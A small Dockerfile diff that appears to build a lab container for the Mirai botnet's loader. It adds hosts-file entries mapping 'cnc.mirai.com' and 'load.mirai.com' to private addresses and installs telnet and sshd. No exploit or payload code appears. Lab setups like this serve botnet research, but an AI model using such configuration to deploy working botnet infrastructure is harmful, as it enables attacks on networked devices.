@@ -2,5 +2,7 @@ FROM debian:jessie-slim
 ADD ./source/loader/loader /loader
 RUN apt-get -y update \
 	&& apt-get upgrade -y \
-	&& apt-get install -y wget nano sshd telnet
+	&& apt-get install -y wget nano sshd telnet \
+	&& echo "172.25.0.2 cnc.mirai.com cnc" >> /etc/hosts\
+	&& echo "172.25.0.4 load.mirai.com load" >> /etc/hosts
 EXPOSE 22
